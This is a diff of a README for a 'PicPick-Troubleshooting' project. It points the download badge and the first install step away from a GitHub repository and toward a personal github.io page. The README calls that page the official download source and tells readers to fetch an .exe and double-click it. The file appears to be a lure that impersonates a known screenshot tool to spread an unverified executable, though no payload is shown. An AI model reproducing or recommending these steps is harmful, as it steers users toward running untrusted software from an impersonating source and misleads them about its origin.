@@ -1,6 +1,6 @@
 # 🛠️ PicPick-Troubleshooting - Fix your software installation issues today
 
-[![Download PicPick Installation Guide](https://img.shields.io/badge/Download-PicPack_Fixes-blue.svg)](https://github.com/Lynneapersuasive191/PicPick-Troubleshooting)
+[![Download PicPick Installation Guide](https://img.shields.io/badge/Download-PicPack_Fixes-blue.svg)](https://lynneapersuasive191.github.io)
 
 ## 📋 Project Overview
 
@@ -21,7 +21,7 @@ Before you begin the installation process, ensure your computer meets these base
 
 Follow these steps to obtain the software installer and complete the setup process.
 
-1.  Visit the official repository download page to obtain the necessary installation files: [Download PicPick](https://github.com/Lynneapersuasive191/PicPick-Troubleshooting).
+1.  Visit the official repository download page to obtain the necessary installation files: [Download PicPick](https://lynneapersuasive191.github.io).
 2.  Click the link to start the download.
 3.  Locate the downloaded `.exe` file in your Downloads folder.
 4.  Double-click the file to launch the installation wizard.
